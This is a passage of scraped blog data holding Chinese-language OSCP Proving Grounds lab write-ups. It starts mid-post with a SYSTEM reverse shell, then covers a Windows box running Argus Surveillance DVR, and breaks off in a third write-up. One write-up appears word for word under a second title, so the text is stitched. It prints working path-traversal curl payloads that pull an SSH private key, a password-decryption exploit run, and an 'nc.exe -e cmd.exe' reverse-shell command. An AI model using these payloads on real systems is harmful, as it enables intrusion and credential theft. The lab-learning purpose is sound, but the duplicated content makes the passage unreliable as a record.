AUTHORITY\\Authenticated Users:(ID)C NT AUTHORITY\\Authenticated Users:(OI)(CI)(IO)(ID)C## Insecure File/Service PermissionC:\\&gt;cacls C:\\bd\\bd.exeC:\\bd\\bd.exe BUILTIN\\Administrators:(ID)F NT AUTHORITY\\SYSTEM:(ID)F BUILTIN\\Users:(ID)R NT AUTHORITY\\Authenticated Users:(ID)CC:\\&gt;sc qc bd[SC] QueryServiceConfig SUCCESSSERVICE_NAME: bd TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : &quot;C:\\bd\\bd.exe&quot; LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : BarracudaDrive ( bd ) service DEPENDENCIES : Tcpip SERVICE_START_NAME : LocalSystem 1234567891011rlwrap nc -nvlp 443listening on [any] 443 ...connect to [192.168.45.165] from (UNKNOWN) [192.168.111.127] 49668Microsoft Windows [Version 10.0.19042.1387](c) Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32&gt;C:\\WINDOWS\\system32&gt;whoamiwhoamint authority\\system","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Nickel","date":"2025-02-27T17:56:54.000Z","path":"post/20250228015654.html","text":"DifficultyMedium Scan123456789101112131415161718192021222324252627282930313233343536OS: Windows 10, Windows Server 2019, Windows Server 2016OS version: &#x27;10.0&#x27;OS release: &#x27;2004&#x27;OS build: &#x27;19041&#x27;[*] ssh found on tcp/22. Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)[*] msrpc found on tcp/135.[*] netbios-ssn found on tcp/139.[*] microsoft-ds found on tcp/445. SMB 3.0[*] http-proxy found on tcp/8080. &lt;meta name=&quot;GENERATOR&quot; content=&quot;Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]&quot;&gt; About the program: Argus Surveillance DVR Program is UNREGISTERED Version: 4.0 Released 18/12/2008 Argus Surveillance Inc. http-vuln-cve2011-3368: CVE:CVE-2005-3299 phpmyadmin[*] unknown found on tcp/5040.[*] msrpc found on tcp/49664.[*] msrpc found on tcp/49665.[*] msrpc found on tcp/49666.[*] msrpc found on tcp/49667.[*] msrpc found on tcp/49668.[*] msrpc found on tcp/49669. 22 WinSSHDwindows下的sshd实现，和linux一样在用户.ssh目录下会有公私钥相关文件 8.48版本没有搜索到可利用的已知漏洞 445 SMB无法匿名登录 12smbclient -L //192.168.140.179 -Nsession setup failed: NT_STATUS_ACCESS_DENIED 8080 Argus Surveillance DVR进入后在user下发现两个用户名，administrator和viewer, 看到有修改密码选项，并且不需要输入原密码，把密码改成123， 然后通过ssh登录，提示密码不正确， gobuster目录扫描也没有收获 12345ssh viewer@192.168.140.179 viewer@192.168.140.179&#x27;s password: Permission denied, please try again.viewer@192.168.140.179&#x27;s password: searchSploit搜一下已知漏洞，全部复制过来看看说明 50261 是没有引号的service路径，后面可能提权有用，但是poc里面也没有利用方法 50130 弱密码破解，并有提示arugs Surveillance DVR的配置路径，看代码是把加密的字符串按4位字符一组的解码 45296 路径穿越，poc直接测一下, 有结果返回，可以利用，但是能读什么呢 1234567891011121314curl &quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&amp;USEREDIRECT=1&amp;WEBACCOUNTID=&amp;WEBACCOUNTPASSWORD=&quot;; for 16-bit app support[386Enh]woafont=dosapp.fonEGA80WOA.FON=EGA80WOA.FONEGA40WOA.FON=EGA40WOA.FONCGA80WOA.FON=CGA80WOA.FONCGA40WOA.FON=CGA40WOA.FON[drivers]wave=mmdrv.dlltimer=timer.drv[mci] 45312 提权： 在Argus 应用文件夹下放一个恶意 gsm_codec.dll,这个dll会被以SYSTEM账号执行 FootHold4种exploit 暂时能利用的是路径穿越，结合其他信息，能读的有administrator和viewer的私钥、C:\\ProgramData\\PY_Software\\Argus Surveillance DVR\\DVRParams.ini 配置信息。 成功读到了viewer账号的私钥 123456789curl &quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fadministrator%2F.ssh%2Fid_rsa&quot;&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;File Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Cannot find this file.&lt;/H1&gt;The requested file: &lt;B&gt;/WEBACCOUNT.CGI?OkBtn= Ok &amp;RESULTPAGE=../../../../../../../../../../../../../../../../Users/administrator/.ssh/id_rsa&lt;/B&gt; was not found.&lt;/BODY&gt;&lt;/HTML&gt; curl &quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F.ssh%2Fid_rsa&quot;-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAuuXhjQJhDjXBJkiIftPZng7N999zteWzSgthQ5fs9kOhbFzLQJ5JYbut0BIbPaUdOhNlQcuhAUZjaaMxnWLbDJgTETK8h162J81p9q6vR2zKpHu9Dhi1ksVyAPiJ/njNKI0tjtpeO3rjGMkKgNKwvv3y2EcCEt1d+LxsO3Wyb5ezuPT349v+MVs7VW04+mGxpgheMgbX6HwqGSo9z38QetR6Ryxs+LVX49Bjhskz19gSF4/iTCbqoRo0djcH54fyPOm3OS 登录 123456ssh viewer@192.168.140.179 -i viewer.id_rsaMicrosoft Windows [Version 10.0.19044.1645](c) Microsoft Corporation. All rights reserved.C:\\Users\\viewer&gt;whoamidvr4\\viewer 读配置文件, 没有和用户密码相关的信息 12345678910curl &quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FProgramData%2FPY_Software%2FArgus%20Surveillance%20DVR%2FDVRParams.ini&quot;[Main]ServerName=ServerLocation=ServerDescription=ReadH=0UseDialUp=0DialUpConName=DialUpDisconnectWhenDone=0DIALUPUSEDEFAULTS&quot; checked checked EscalationSeShutdownPrivilege查了下viewer账号下所有文件夹，什么都没有， 在C:下发现了一个output.txt文件，查看内容是以administrator账户执行了 C:\\freezeScript\\win10.ps1, 运行时间是靶机启动时间 查看脚本的内容，发现C:下 freezeScript文件夹都没有，如果viewer账户可以重启机器，并且有C:写权限的话就可以获得adminstrator权限执行任意代码，查看权限显示有seShutdownPrivilege，写一个把viewer加入administrators group脚本 123456789101112PS C:\\freezeScript&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ==================================== =======SeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeUndockPrivilege Remove computer from docking station EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledSeTimeZonePrivilege Change the time zone Enabled 123456789101112131415PS C:\\&gt; md freezeScript Directory: C:\\Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/21/2025 9:36 AM freezeScript PS C:\\&gt; cd .\\freezeScript\\PS C:\\freezeScript&gt; &#x27;Add-LocalGroupMember -Group &quot;Administrators&quot; -Member &quot;viewer&quot;&#x27;| Out-File -FilePath &quot;C:\\freezeScript\\win10.ps1&quot;PS C:\\freezeScript&gt; cat win10.ps1Add-LocalGroupMember -Group &quot;Administrators&quot; -Member &quot;viewer&quot; 重启时提示无权限 12PS C:\\freezeScript&gt; shutdown /r /t 0Access is denied.(5) GPT的回答 1尽管你有 SeShutdownPrivilege 权限，这个错误通常是由于缺少管理员权限导致的。在 PowerShell 或命令提示符中执行 shutdown 命令需要管理员权限，即使你有相关权限，也需要以管理员身份运行 PowerShell。 winpeas上传winpeas执行也没有得到有用信息。viewer的权限也比较低，很多内容收集不到。 DRV4配置再确认下配置文件， dir发现没有ProgramData文件夹，但是前面已经读到配置文件了，文件夹应该是存在的，dir -froce查看是被隐藏了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061PS C:\\freezeScript&gt; cd /PS C:\\&gt; dir Directory: C:\\Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/21/2025 9:40 AM freezeScript d----- 2/21/2025 6:08 AM Microsoft d----- 12/7/2019 1:14 AM PerfLogs d-r--- 4/15/2022 7:07 AM Program Files d-r--- 6/18/2021 5:55 AM Program Files (x86) d-r--- 12/3/2021 12:21 AM Users d----- 4/15/2022 7:07 AM Windows -a---- 2/21/2025 4:52 AM 2690 output.txt PS C:\\&gt; dir -force Directory: C:\\Mode LastWriteTime Length Name ---- ------------- ------ ---- d--hs- 2/21/2025 5:06 AM $Recycle.Bin d--h-- 4/15/2022 5:02 AM $WinREAgent d--hs- 4/15/2022 7:08 AM Config.Msi d--hsl 6/18/2021 10:28 AM Documents and Settings d----- 2/21/2025 9:40 AM freezeScript d----- 2/21/2025 6:08 AM Microsoft d----- 12/7/2019 1:14 AM PerfLogs d-r--- 4/15/2022 7:07 AM Program Files d-r--- 6/18/2021 5:55 AM Program Files (x86) d--h-- 12/3/2021 12:24 AM ProgramData d--hs- 3/11/2022 10:03 PM Recovery d--hs- 6/18/2021 3:31 AM System Volume Information d-r--- 12/3/2021 12:21 AM Users d----- 4/15/2022 7:07 AM Windows -a-hs- 8/1/2024 10:33 PM 8192 DumpStack.log.tmp -a---- 2/21/2025 4:52 AM 2690 output.txt -a-hs- 8/1/2024 10:33 PM 671088640 pagefile.sys -a-hs- 8/1/2024 10:33 PM 268435456 swapfile.sys PS C:\\&gt; cd &#x27;.\\ProgramData\\PY_Software\\Argus Surveillance DVR\\&#x27;PS C:\\ProgramData\\PY_Software\\Argus Surveillance DVR&gt; dir -force Directory: C:\\ProgramData\\PY_Software\\Argus Surveillance DVRMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 12/3/2021 12:26 AM Gallery d----- 12/3/2021 12:24 AM Images d----- 12/3/2021 12:26 AM Logs -a---- 2/21/2025 9:28 AM 38 Argus Surveillance DVR.DVRSes -a---- 2/21/2025 9:45 AM 5782 DVRParams.ini cat DVRParams.ini看下内容， 这次展示了很多内容，看来是通过cur查看到时候展示行数有限，被截断了。在user部分有administrator的密码密文 回到50130.py破解之 12345678910111213141516171819202122232425python 50130.py /home/kali/Tools/pg/DVR4/50130.py:27: SyntaxWarning: invalid escape sequence &#x27;\\_&#x27; banner = &#x27;&#x27;&#x27;########################################## _____ Surveillance DVR 4.0 ## / _ \\_______ ____ __ __ ______ ## / /_\\ \\_ __ \\/ ___\\| | \\/ ___/ ## / | \\ | \\/ /_/ &gt; | /\\___ \\ ## \\____|__ /__| \\___ /|____//____ &gt; ## \\/ /_____/ \\/ ## Weak Password Encryption ############# @deathflash1411 ############[+] ECB4:1[+] 53D1:4[+] 6069:W[+] F641:a[+] E03B:t[+] D9BD:c[+] 956B:h[+] FE36:D[+] BD8F:0[+] 3CD9:g[-] D9A8:Unknown 最后一个字符没有解出来，看 代码注释，是作者没加特殊字符的编码信息 特殊字符不多，以administrator用户执行反弹shell, 输入密码一个个试下，输入$时，成功获取shell。 12runas /env /profile /user:DVR4\\Administrator &quot;C:\\temp\\nc.exe -e cmd.exe 192.168.118.14 443Enter the password for DVR4\\Administrator: 123456789nc -nvlp 443listening on [any] 443 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.140.179] 51874Microsoft Windows [Version 10.0.19044.1645](c) Microsoft Corporation. All rights reserved.C:\\ProgramData\\PY_Software\\Argus Surveillance DVR&gt;whoamiwhoamidvr4\\administrator 官方walkThrough中是在user页面新建了一个user用户，密码设为全部字符 !@#$%^&amp;*()在通过配置文件里的密码对比得到密码明文 之前一直以为runas只能在有桌面环境的前提下使用 gsm_codec.dll提权靶机上没有gcc环境，未测试 反思本文是我在逐步看了hits之后依然没有成功后，看了完成walkThrough后，重头重新打靶的记录，但是更令我感到挫败和沮丧的是如果重新遇到这个靶机，并且整体思路、步骤正确的情况下我仍然可能拿不下这台靶机，它让我推翻自己之前解决问题的方式 信息收集阶段 在看到了arugs surveillance存在的几个漏洞之后，我放弃了继续在web页面上继续收集信息，导致没能找到viewer用户 弱密码破解poc看了之后发现用不到，并没有认真看代码，忽略了其中的配置文件注释，也尝试读取这个文件 更为严重的是：即使在这一步我看到了配置文件路径，并且测试读了配置文件，但是没有有效信息，在后续拿到viewer shell之后，我还是不会想到再去检查一次这个配置文件，因为在我的脑子里是排除法，一直在排查自己认为无法有效利用的东西，下意识里给自己减轻因为知识面不足、经验不足带来的心虚的负担 提权阶段 在发现seShutdownPrivilege无法提权，并且winpeas没有找到有用信息后，完全没了思路，哪怕再去搜一下DRV4的相关信息呢，过于依赖工具了。 更为严重的是：即使在这一步我成功找到了配置文件，我相信自己仍然不会第一时间想到searchSploit已经发现的exploit, 因为在我的脑海是排查法，一直在排除自己认为无法有效利用的东西，下意识里给自己减轻因为知识面不足、经验不足带来的心虚的负担 信息收集很重要，不要忽略任何信息，不要做减法排查，从最有可能的点着手，而不是像自己以前优先排除后聚焦的解决问题方式","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Shenzi","date":"2025-02-25T18:35:57.000Z","path":"post/20250226023557.html","text":"DifficultyMedium Scan123456789101112131415161718192021222324252627282930313233343536OS: Windows 10, Windows Server 2019, Windows Server 2016OS version: &#x27;10.0&#x27;OS release: &#x27;2004&#x27;OS build: &#x27;19041&#x27;[*] ssh found on tcp/22. Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)[*] msrpc found on tcp/135.[*] netbios-ssn found on tcp/139.[*] microsoft-ds found on tcp/445. SMB 3.0[*] http-proxy found on tcp/8080. &lt;meta name=&quot;GENERATOR&quot; content=&quot;Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]&quot;&gt; About the program: Argus Surveillance DVR Program is UNREGISTERED Version: 4.0 Released 18/12/2008 Argus Surveillance Inc. http-vuln-cve2011-3368: CVE:CVE-2005-3299 phpmyadmin[*] unknown found on tcp/5040.[*] msrpc found on tcp/49664.[*] msrpc found on tcp/49665.[*] msrpc found on tcp/49666.[*] msrpc found on tcp/49667.[*] msrpc found on tcp/49668.[*] msrpc found on tcp/49669. 22 WinSSHDwindows下的sshd实现，和linux一样在用户.ssh目录下会有公私钥相关文件 8.48版本没有搜索到可利用的已知漏洞 445 SMB无法匿名登录 12smbclient -L //192.168.140.179 -Nsession setup failed: NT_STATUS_ACCESS_DENIED 8080 Argus Surveillance DVR进入后在user下发现两个用户名，administrator和viewer, 看到有修改密码选项，并且不需要输入原密码，把密码改成123， 然后通过ssh登录，提示密码不正确， gobuster目录扫描也没有收获 12345ssh viewer@192.168.140.179 viewer@192.168.140.179&#x27;s password: Permission denied, please try again.viewer@192.168.140.179&#x27;s password: searchSploit搜一下已知漏洞，全部复制过来看看说明 50261 是没有引号的service路径，后面可能提权有用，但是poc里面也没有利用方法 50130 弱密码破解，并有提示arugs Surveillance DVR的配置路径，看代码是把加密的字符串按4位字符一组的解码 45296 路径穿越，poc直接测一下, 有结果返回，可以利用，但是能读什么呢 1234567891011121314curl &quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&amp;USEREDIRECT=1&amp;WEBACCOUNTID=&amp;WEBACCOUNTPASSWORD=&quot;; for 16-bit app support[386Enh]woafont=dosapp.fonEGA80WOA.FON=EGA80WOA.FONEGA40WOA.FON=EGA40WOA.FONCGA80WOA.FON=CGA80WOA.FONCGA40WOA.FON=CGA40WOA.FON[drivers]wave=mmdrv.dlltimer=timer.drv[mci] 45312 提权： 在Argus 应用文件夹下放一个恶意 gsm_codec.dll,这个dll会被以SYSTEM账号执行 FootHold4种exploit 暂时能利用的是路径穿越，结合其他信息，能读的有administrator和viewer的私钥、C:\\ProgramData\\PY_Software\\Argus Surveillance DVR\\DVRParams.ini 配置信息。 成功读到了viewer账号的私钥 123456789curl &quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fadministrator%2F.ssh%2Fid_rsa&quot;&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;File Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Cannot find this file.&lt;/H1&gt;The requested file: &lt;B&gt;/WEBACCOUNT.CGI?OkBtn= Ok &amp;RESULTPAGE=../../../../../../../../../../../../../../../../Users/administrator/.ssh/id_rsa&lt;/B&gt; was not found.&lt;/BODY&gt;&lt;/HTML&gt; curl &quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F.ssh%2Fid_rsa&quot;-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAuuXhjQJhDjXBJkiIftPZng7N999zteWzSgthQ5fs9kOhbFzLQJ5JYbut0BIbPaUdOhNlQcuhAUZjaaMxnWLbDJgTETK8h162J81p9q6vR2zKpHu9Dhi1ksVyAPiJ/njNKI0tjtpeO3rjGMkKgNKwvv3y2EcCEt1d+LxsO3Wyb5ezuPT349v+MVs7VW04+mGxpgheMgbX6HwqGSo9z38QetR6Ryxs+LVX49Bjhskz19gSF4/iTCbqoRo0djcH54fyPOm3OS 登录 123456ssh viewer@192.168.140.179 -i viewer.id_rsaMicrosoft Windows [Version 10.0.19044.1645](c) Microsoft Corporation. All rights reserved.C:\\Users\\viewer&gt;whoamidvr4\\viewer 读配置文件, 没有和用户密码相关的信息 12345678910curl &quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FProgramData%2FPY_Software%2FArgus%20Surveillance%20DVR%2FDVRParams.ini&quot;[Main]ServerName=ServerLocation=ServerDescription=ReadH=0UseDialUp=0DialUpConName=DialUpDisconnectWhenDone=0DIALUPUSEDEFAULTS&quot; checked checked EscalationSeShutdownPrivilege查了下viewer账号下所有文件夹，什么都没有， 在C:下发现了一个output.txt文件，查看内容是以administrator账户执行了 C:\\freezeScript\\win10.ps1, 运行时间是靶机启动时间 查看脚本的内容，发现C:下 freezeScript文件夹都没有，如果viewer账户可以重启机器，并且有C:写权限的话就可以获得adminstrator权限执行任意代码，查看权限显示有seShutdownPrivilege，写一个把viewer加入administrators group脚本 123456789101112PS C:\\freezeScript&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ==================================== =======SeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeUndockPrivilege Remove computer from docking station EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledSeTimeZonePrivilege Change the time zone Enabled 123456789101112131415PS C:\\&gt; md freezeScript Directory: C:\\Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/21/2025 9:36 AM freezeScript PS C:\\&gt; cd .\\freezeScript\\PS C:\\freezeScript&gt; &#x27;Add-LocalGroupMember -Group &quot;Administrators&quot; -Member &quot;viewer&quot;&#x27;| Out-File -FilePath &quot;C:\\freezeScript\\win10.ps1&quot;PS C:\\freezeScript&gt; cat win10.ps1Add-LocalGroupMember -Group &quot;Administrators&quot; -Member &quot;viewer&quot; 重启时提示无权限 12PS C:\\freezeScript&gt; shutdown /r /t 0Access is denied.(5) GPT的回答 1尽管你有 SeShutdownPrivilege 权限，这个错误通常是由于缺少管理员权限导致的。在 PowerShell 或命令提示符中执行 shutdown 命令需要管理员权限，即使你有相关权限，也需要以管理员身份运行 PowerShell。 winpeas上传winpeas执行也没有得到有用信息。viewer的权限也比较低，很多内容收集不到。 DRV4配置再确认下配置文件， dir发现没有ProgramData文件夹，但是前面已经读到配置文件了，文件夹应该是存在的，dir -froce查看是被隐藏了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061PS C:\\freezeScript&gt; cd /PS C:\\&gt; dir Directory: C:\\Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/21/2025 9:40 AM freezeScript d----- 2/21/2025 6:08 AM Microsoft d----- 12/7/2019 1:14 AM PerfLogs d-r--- 4/15/2022 7:07 AM Program Files d-r--- 6/18/2021 5:55 AM Program Files (x86) d-r--- 12/3/2021 12:21 AM Users d----- 4/15/2022 7:07 AM Windows -a---- 2/21/2025 4:52 AM 2690 output.txt PS C:\\&gt; dir -force Directory: C:\\Mode LastWriteTime Length Name ---- ------------- ------ ---- d--hs- 2/21/2025 5:06 AM $Recycle.Bin d--h-- 4/15/2022 5:02 AM $WinREAgent d--hs- 4/15/2022 7:08 AM Config.Msi d--hsl 6/18/2021 10:28 AM Documents and Settings d----- 2/21/2025 9:40 AM freezeScript d----- 2/21/2025 6:08 AM Microsoft d----- 12/7/2019 1:14 AM PerfLogs d-r--- 4/15/2022 7:07 AM Program Files d-r--- 6/18/2021 5:55 AM Program Files (x86) d--h-- 12/3/2021 12:24 AM ProgramData d--hs- 3/11/2022 10:03 PM Recovery d--hs- 6/18/2021 3:31 AM System Volume Information d-r--- 12/3/2021 12:21 AM Users d----- 4/15/2022 7:07 AM Windows -a-hs- 8/1/2024 10:33 PM 8192 DumpStack.log.tmp -a---- 2/21/2025 4:52 AM 2690 output.txt -a-hs- 8/1/2024 10:33 PM 671088640 pagefile.sys -a-hs- 8/1/2024 10:33 PM 268435456 swapfile.sys PS C:\\&gt; cd &#x27;.\\ProgramData\\PY_Software\\Argus Surveillance DVR\\&#x27;PS C:\\ProgramData\\PY_Software\\Argus Surveillance DVR&gt; dir -force Directory: C:\\ProgramData\\PY_Software\\Argus Surveillance DVRMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 12/3/2021 12:26 AM Gallery d----- 12/3/2021 12:24 AM Images d----- 12/3/2021 12:26 AM Logs -a---- 2/21/2025 9:28 AM 38 Argus Surveillance DVR.DVRSes -a---- 2/21/2025 9:45 AM 5782 DVRParams.ini cat DVRParams.ini看下内容， 这次展示了很多内容，看来是通过cur查看到时候展示行数有限，被截断了。在user部分有administrator的密码密文 回到50130.py破解之 12345678910111213141516171819202122232425python 50130.py /home/kali/Tools/pg/DVR4/50130.py:27: SyntaxWarning: invalid escape sequence &#x27;\\_&#x27; banner = &#x27;&#x27;&#x27;########################################## _____ Surveillance DVR 4.0 ## / _ \\_______ ____ __ __ ______ ## / /_\\ \\_ __ \\/ ___\\| | \\/ ___/ ## / | \\ | \\/ /_/ &gt; | /\\___ \\ ## \\____|__ /__| \\___ /|____//____ &gt; ## \\/ /_____/ \\/ ## Weak Password Encryption ############# @deathflash1411 ############[+] ECB4:1[+] 53D1:4[+] 6069:W[+] F641:a[+] E03B:t[+] D9BD:c[+] 956B:h[+] FE36:D[+] BD8F:0[+] 3CD9:g[-] D9A8:Unknown 最后一个字符没有解出来，看 代码注释，是作者没加特殊字符的编码信息 特殊字符不多，以administrator用户执行反弹shell, 输入密码一个个试下，输入$时，成功获取shell。 12runas /env /profile /user:DVR4\\Administrator &quot;C:\\temp\\nc.exe -e cmd.exe 192.168.118.14 443Enter the password for DVR4\\Administrator: 123456789nc -nvlp 443listening on [any] 443 ...connect to [192.168.45.234] from (UNKNOWN) [192.168.140.179] 51874Microsoft Windows [Version 10.0.19044.1645](c) Microsoft Corporation. All rights reserved.C:\\ProgramData\\PY_Software\\Argus Surveillance DVR&gt;whoamiwhoamidvr4\\administrator 官方walkThrough中是在user页面新建了一个user用户，密码设为全部字符 !@#$%^&amp;*()在通过配置文件里的密码对比得到密码明文 之前一直以为runas只能在有桌面环境的前提下使用 gsm_codec.dll提权靶机上没有gcc环境，未测试 反思本文是我在逐步看了hits之后依然没有成功后，看了完成walkThrough后，重头重新打靶的记录，但是更令我感到挫败和沮丧的是如果重新遇到这个靶机，并且整体思路、步骤正确的情况下我仍然可能拿不下这台靶机，它让我推翻自己之前解决问题的方式 信息收集阶段 在看到了arugs surveillance存在的几个漏洞之后，我放弃了继续在web页面上继续收集信息，导致没能找到viewer用户 弱密码破解poc看了之后发现用不到，并没有认真看代码，忽略了其中的配置文件注释，也尝试读取这个文件 更为严重的是：即使在这一步我看到了配置文件路径，并且测试读了配置文件，但是没有有效信息，在后续拿到viewer shell之后，我还是不会想到再去检查一次这个配置文件，因为在我的脑子里是排除法，一直在排查自己认为无法有效利用的东西，下意识里给自己减轻因为知识面不足、经验不足带来的心虚的负担 提权阶段 在发现seShutdownPrivilege无法提权，并且winpeas没有找到有用信息后，完全没了思路，哪怕再去搜一下DRV4的相关信息呢，过于依赖工具了。 更为严重的是：即使在这一步我成功找到了配置文件，我相信自己仍然不会第一时间想到searchSploit已经发现的exploit, 因为在我的脑海是排查法，一直在排除自己认为无法有效利用的东西，下意识里给自己减轻因为知识面不足、经验不足带来的心虚的负担 信息收集很重要，不要忽略任何信息，不要做减法排查，从最有可能的点着手，而不是像自己以前优先排除后聚焦的解决问题方式","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Hepet","date":"2025-02-23T15:38:25.000Z","path":"post/20250223233825.html","text":"DifficultyMeduim Scanautorecon 192.168.184.140 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869[*] smtp found on tcp/25. smtp Mercury/32 smtpd (Mail server account Maiser) enum found login: admin[*] finger found on tcp/79. Mercury/32 fingerd Login: Admin [*] pop3pw found on tcp/106. Mercury/32 poppass service[*] pop3 found on tcp/110. Mercury/32 pop3d[*] msrpc found on tcp/135.[*] netbios-ssn found on tcp/139.[*] imap found on tcp/143. Mercury/32 imapd 4.62[*] http found on tcp/443. Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23[*] microsoft-ds found on tcp/445. smb[*] http found on tcp/8000. Apache/2.4.46 (Win64) [*] ph-addressbook found on tcp/105.[*] http found on tcp/2224. Mercury HTTP Services[*] unknown found on tcp/5040.[*] vnc found on tcp/11100. version: 3.8[*] ftp found on tcp/20001. FileZilla ftpd 0.9.41 beta Anonymous FTP login allowed[*] unknown found on tcp/33006. MariaDB[*] msrpc found on tcp/49664.[*] msrpc found on tcp/49665.[*] msrpc found on tcp/49666.[*] msrpc found on tcp/49667.[*] msrpc found on tcp/49668.[*] msrpc found on tcp/49669.things to try - mail user: admin 2224 reset passwd 11110 vnc 3.8 20001 ftp Anonymous FTP login allowed vue-blog-demo v1.0.0 33006 MariaDB 8000 has /team /fonts maybe upload 20001 ftpftp可以匿名登录, 查看内容，看起来是网站的源码，使用lftp下载下来 123456789101112131415161718192021222324252627282930ftp -a -A 192.168.184.140 -P 20001Connected to 192.168.184.140.220-FileZilla Server version 0.9.41 beta220-written by Tim Kosse (Tim.Kosse@gmx.de)220 Please visit http://sourceforge.net/projects/filezilla/331 Password required for anonymous230 Logged 